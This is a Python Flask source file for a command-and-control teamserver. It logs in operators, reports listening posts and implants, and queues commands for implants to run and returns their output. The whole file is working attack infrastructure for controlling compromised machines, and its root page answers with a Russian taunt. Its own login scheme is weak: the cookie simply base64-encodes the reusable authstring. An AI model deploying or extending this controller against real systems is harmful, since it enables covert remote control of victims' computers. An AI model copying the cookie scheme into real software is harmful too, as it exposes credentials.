import base64
import asyncio
import flask
import json
import copy
from time import time

from lib import management
from lib import instructions

loop = asyncio.get_event_loop()
app = flask.Flask(__name__)


class Teamserver(object):
    def __init__(self, args):
        self.info = {"name": "teamserver",
                     "author": "und3rf10w"
                     }
        self.status = "INIT"
        super(Teamserver, self).__init__()

    def make_response(self):
        # Every response will be processed here, used to set headers
        response = flask.make_response()
        response.headers['Server'] = teamserver.config['server_header']
        return response

    @app.route("/")
    def teamserver_root():
        teamserver.logging.log("hit on /", source="teamserver")
        # TODO: Support flask template rendering instead of a string
        response = teamserver.teamserver.make_response()
        try:
            response.set_data(teamserver.config['root_return_string'])
            return response
        except KeyError:
            response.set_data("Попрешь на крутых, уроем как остальных")
            return response

    @app.route("/login", methods=["POST"])
    def teamserver_login_user():
        """
        Login a user to the teamserver
        :return:
        """
        error = False
        success = False
        response = {"success": success, "error": error}
        data = flask.request.get_json(force=True)
        try:
            try:
                username = data['username']
                authstring = data['authstring']
            except KeyError:
                raise ValueError

            teamserver.logging.log(f"Authentication attempt from {flask.request.remote_addr} for user {data['username']}",
                                   source=f"{teamserver.teamserver.info['name']}")

            if base64.b64decode(authstring).decode("utf-8") == teamserver.config['authstring']:
                teamserver.logging.log(f"Authenticated {data['username']} from {flask.request.remote_addr}",
                                       source=f"{teamserver.teamserver.info['name']}")
                success = True
            else:
                teamserver.logging.log(f"Authentication Failed for {data['username']} from {flask.request.remote_addr}:"
                                       f" Invalid Authstring",
                                       source=f"{teamserver.teamserver.info['name']}")
                raise KeyError

            if success and username:
                response['username'] = username
                auth_cookie = base64.b64encode(f"{username} `|` {authstring}".encode('utf-8'))
            else:
                raise KeyError

            res = teamserver.teamserver.make_response()
            if success: res.set_cookie('Auth', auth_cookie)

        except ValueError:
            error = True
            success = False
            res = teamserver.teamserver.make_response()
        response = {"success": success}
        if error:
            response['error'] = error
        res.set_data(json.dumps(response))
        return res

    @app.route("/get-stats", methods=["GET"])
    def teamserver_get_stats():
        """
        REQUIRES-LOGIN: Get the stats of the teamserver. Basically just listening post manifests and implant manifests

        :return:
        """

        error = False
        success = False

        response = teamserver.teamserver.make_response()
        response.set_data(json.dumps({"success": success}))
        # Get the cookie
        try:
            cookie = flask.request.cookies.get("Auth")
            username, recv_authstring = base64.b64decode(cookie).decode('utf-8').split(" `|` ")
            if base64.b64decode(recv_authstring).decode("utf-8") == teamserver.config['authstring']:
                # Process the command
                listeners = []
                implants = []
                if len(teamserver.listeners) > 0:
                    for listening_post in teamserver.listeners:
                        rcpt_listener = copy.copy(listening_post)
                        rcpt_listener['lpk'] = str(rcpt_listener['lpk'])
                        del rcpt_listener['implants']
                        listeners.append(rcpt_listener)
                if len(teamserver.implants) > 0:
                    for implant in teamserver.implants:
                        rcpt_implant = copy.copy(implant)
                        rcpt_implant['ipk'] = str(rcpt_implant['ipk'])
                        rcpt_implant['lpk'] = str(rcpt_implant['lpk'])
                        del rcpt_implant['priv_key']
                        implants.append(rcpt_implant)
                data = {"listeners": listeners, "implants": implants, "cmd_sent": teamserver.cmd_sent, "cmd_queue": teamserver.cmd_queue}
                success = True
                teamserver.logging.log(f"{username}: get-stats",
                                       level="info", source=f"{teamserver.teamserver.info['name']}")
                response.set_data(json.dumps({"success": success, "data": data}))
            else:
                # Authstring likely didn't match
                error = True
                response.set_data(json.dumps({"success": success, "error": error}))
                teamserver.logging.log(f"Client: {flask.request.remote_addr} error "
                                       f"err: INVALID_AUTHSTRING | "
                                       f"page: {flask.request.endpoint}",
                                       level="error", source=f"{teamserver.teamserver.info['name']}")
        except Exception as e:
            teamserver.logging.log(f"Client: {flask.request.remote_addr} error | type: {type(e).__name__} | "
                                   f"err: {e} | " 
                                   f"page: {flask.request.endpoint}",
                                   level="error", source=f"{teamserver.teamserver.info['name']}")
            error = True

        return response

    @app.route("/get_cmd", methods=["POST"])
    def teamserver_get_cmd():
        """
        Run a command on an implant

        :return:
        """

        error = False
        success = False

        response = teamserver.teamserver.make_response()
        response.set_data(json.dumps({"success": success}))
        # Get the cookie
        try:
            cookie = flask.request.cookies.get("Auth")
            username, recv_authstring = base64.b64decode(cookie).decode('utf-8').split(" `|` ")
            if base64.b64decode(recv_authstring).decode("utf-8") == teamserver.config['authstring']:
                # Process the command
                data = flask.request.get_json(force=True)
                teamserver.logging.log(f"{username}: getting output for cmd {data['txid']}",
                                       level="debug", source=f"{teamserver.teamserver.info['name']}")
                cmd_index = management._get_cmd_sent_index(teamserver, data['txid'])
                if cmd_index is None:
                    cmd_index = management._get_cmd_queue_index(teamserver, data['txid'])
                    response_data = teamserver.cmd_queue[cmd_index]
                    success = True
                    response.set_data(json.dumps({"success": success, "data": response_data}))
                else:
                    response_data = teamserver.cmd_sent[cmd_index]
                    success = True
                    response.set_data(json.dumps({"success": success, "data": response_data}))
                if response_data is None:
                    error = True
                    success = False
                    response.set_data(json.dumps({"success": success, "error": error}))
        except Exception as e:
            teamserver.logging.log(f"Client: {flask.request.remote_addr} error | type: {type(e).__name__} | "
                                   f"err: {e} | "
                                   f"page: {flask.request.endpoint}",
                                   level="error", source=f"{teamserver.teamserver.info['name']}")
            error = True
            response.set_data(json.dumps({"success": success, "error": error}))
        return response

    @app.route("/cmd", methods=["POST"])
    def teamserver_run_cmd():
        """
        Run a command on an implant

        :return:
        """

        error = False
        success = False

        response = teamserver.teamserver.make_response()
        response.set_data(json.dumps({"success": success}))
        # Get the cookie
        try:
            cookie = flask.request.cookies.get("Auth")
            username, recv_authstring = base64.b64decode(cookie).decode('utf-8').split(" `|` ")
            if base64.b64decode(recv_authstring).decode("utf-8") == teamserver.config['authstring']:
                # Process the command
                data = flask.request.get_json(force=True)
                # TODO: Verify that the command exists in the command library
                #   * If not, return an error
                #   * If yes, continue to generate the instruction frame
                #   * Verify whether implant exists in manifest
                data['history'] = []
                event_history = {"timestamp": time(), "event": "ISSUED", "component": "server"}
                data['history'].append(event_history)
                instruction_frame = instructions.create_instruction_frame(data)
                teamserver.logging.log(f"{username}: {data['cmd']} | component_id: {data['component_id']}"
                                       f" | txid: {instruction_frame['txid']}",
                                       level="info", source=f"{teamserver.teamserver.info['name']}")
                teamserver.logging.log(f"{username}: {data['cmd']} | frame: {instruction_frame}",
                                       level="debug", source=f"{teamserver.teamserver.info['name']}")

                # TODO: Resolve the destination component from instruction_frame['component_id']
                teamserver.add_instruction_to_cmd_queue(instruction_frame)
                success = True
                response.set_data(json.dumps({"success": success, "txid": instruction_frame['txid']}))

            else:
                # Our auth string didn't match
                error = True
                response.set_data(json.dumps({"success": success, "error": error}))
                teamserver.logging.log(f"Client: {flask.request.remote_addr} error "
                                       f"err: INVALID_AUTHSTRING | "
                                       f"page: {flask.request.endpoint}",
                                       level="error", source=f"{teamserver.teamserver.info['name']}")
        except Exception as e:
            teamserver.logging.log(f"Client: {flask.request.remote_addr} error | type: {type(e).__name__} | "
                                   f"err: {e} | " 
                                   f"page: {flask.request.endpoint}",
                                   level="error", source=f"{teamserver.teamserver.info['name']}")
            error = True

        return response

    def validate_cookie(self, cookie):
        print(cookie)

    def start_teamserver(self, *args):
        global teamserver

        teamserver = args[0]

        try:
            teamserver.http_server = app.run(host=teamserver.http_addr, port=teamserver.http_port)
        except Exception as e:
            teamserver.logging.log(f"Critical [{type(e).__name__}] when starting teamserver api server: {e}",
                                   level="critical", source=f"{teamserver.teamserver.info['name']}")
            exit()
